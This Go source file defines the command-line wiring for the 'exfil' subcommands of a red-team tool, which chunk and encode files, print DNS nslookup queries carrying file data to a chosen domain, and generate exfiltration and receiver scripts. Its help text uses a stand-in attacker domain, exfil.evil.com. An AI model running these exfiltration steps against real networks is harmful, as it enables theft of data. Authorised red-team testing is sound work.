package redteam

import (
	"fmt"

	"github.com/Raxuis/RaxuisCLI/cmd"
	"github.com/Raxuis/RaxuisCLI/internal/redteam/exfil"

	"github.com/Raxuis/RaxuisCLI/internal/shared/output"
	"github.com/spf13/cobra"
)

var exfilChunkSize int
var exfilMethod string
var exfilTarget string

var exfilCmd = &cobra.Command{
	Use:   "exfil",
	Short: "Data exfiltration helpers",
	Long: `Data exfiltration toolkit for moving data out of networks.

Chunk files, encode data, and generate exfiltration scripts.

Examples:
  raxuiscli exfil chunk secret.zip --size 1024
  raxuiscli exfil encode file.txt --method dns
  raxuiscli exfil script dns --target exfil.evil.com
  raxuiscli exfil receiver http --port 8080`,
	RunE: func(cmd *cobra.Command, args []string) error {
		_ = cmd.Help()
		return nil
	},
}

var exfilChunkCmd = &cobra.Command{
	Use:   "chunk [file]",
	Short: "Split file into chunks",
	Long:  `Split a file into chunks for exfiltration.`,
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		filePath := args[0]

		if exfilChunkSize <= 0 {
			exfilChunkSize = 1024
		}

		chunks, err := exfil.ChunkFile(filePath, exfilChunkSize)
		if err != nil {
			return err
		}

		exfil.DisplayChunks(chunks)
		return nil
	},
}

var exfilEncodeCmd = &cobra.Command{
	Use:   "encode [file]",
	Short: "Encode file for exfiltration",
	Long: `Encode a file for exfiltration through various channels.

Methods:
  base64 - Base64 encoding
  hex    - Hexadecimal encoding
  dns    - DNS-safe encoding`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		filePath := args[0]

		if exfilChunkSize <= 0 {
			exfilChunkSize = 60 // DNS-friendly size
		}

		chunks, err := exfil.ChunkFile(filePath, exfilChunkSize)
		if err != nil {
			return err
		}

		method := exfil.EncodingMethod(exfilMethod)
		exfil.DisplayEncodedChunks(chunks, method, 5)
		return nil
	},
}

var exfilDNSCmd = &cobra.Command{
	Use:   "dns [file]",
	Short: "Generate DNS exfiltration queries",
	Long:  `Generate DNS queries for exfiltrating a file.`,
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		filePath := args[0]

		if exfilTarget == "" {
			return fmt.Errorf("--target domain is required")
		}

		chunks, err := exfil.ChunkFile(filePath, 40) // Smaller for DNS
		if err != nil {
			return err
		}

		fmt.Fprintln(output.Std, "\n[DNS EXFILTRATION QUERIES]")
		fmt.Fprintln(output.Std, "==========================")
		fmt.Fprintf(output.Std, "File: %s\n", filePath)
		fmt.Fprintf(output.Std, "Domain: %s\n", exfilTarget)
		fmt.Fprintf(output.Std, "Chunks: %d\n\n", len(chunks))

		limit := 5
		if limit > len(chunks) {
			limit = len(chunks)
		}

		for i := 0; i < limit; i++ {
			query := exfil.BuildDNSQuery(&chunks[i], exfilTarget)
			fmt.Fprintf(output.Std, "nslookup %s\n", query)
		}

		if len(chunks) > limit {
			fmt.Fprintf(output.Std, "... and %d more queries\n", len(chunks)-limit)
		}
		return nil
	},
}

var exfilScriptCmd = &cobra.Command{
	Use:   "script [method]",
	Short: "Generate exfiltration script",
	Long: `Generate a complete exfiltration script.

Methods: dns, http, icmp`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		method := args[0]

		if exfilTarget == "" {
			return fmt.Errorf("--target is required")
		}

		script := exfil.GenerateExfilScript(method, exfilTarget)

		fmt.Fprintf(output.Std, "\n[EXFILTRATION SCRIPT - %s]\n", method)
		fmt.Fprintln(output.Std, "================================")
		fmt.Fprintln(output.Std, script)
		return nil
	},
}

var exfilReceiverPort int

var exfilReceiverCmd = &cobra.Command{
	Use:   "receiver [method]",
	Short: "Generate receiver script",
	Long: `Generate a server-side receiver script.

Methods: dns, http`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		method := args[0]

		script := exfil.GenerateReceiverScript(method, exfilReceiverPort)

		fmt.Fprintf(output.Std, "\n[RECEIVER SCRIPT - %s]\n", method)
		fmt.Fprintln(output.Std, "============================")
		fmt.Fprintln(output.Std, script)
		return nil
	},
}

func init() {
	cmd.RootCmd.AddCommand(exfilCmd)

	// Chunk subcommand
	exfilCmd.AddCommand(exfilChunkCmd)
	exfilChunkCmd.Flags().IntVarP(&exfilChunkSize, "size", "s", 1024, "Chunk size in bytes")

	// Encode subcommand
	exfilCmd.AddCommand(exfilEncodeCmd)
	exfilEncodeCmd.Flags().StringVarP(&exfilMethod, "method", "m", "base64", "Encoding method")
	exfilEncodeCmd.Flags().IntVarP(&exfilChunkSize, "size", "s", 60, "Chunk size")

	// DNS subcommand
	exfilCmd.AddCommand(exfilDNSCmd)
	exfilDNSCmd.Flags().StringVarP(&exfilTarget, "target", "t", "", "Target domain")

	// Script subcommand
	exfilCmd.AddCommand(exfilScriptCmd)
	exfilScriptCmd.Flags().StringVarP(&exfilTarget, "target", "t", "", "Target address")

	// Receiver subcommand
	exfilCmd.AddCommand(exfilReceiverCmd)
	exfilReceiverCmd.Flags().IntVarP(&exfilReceiverPort, "port", "p", 8080, "Listen port")
}
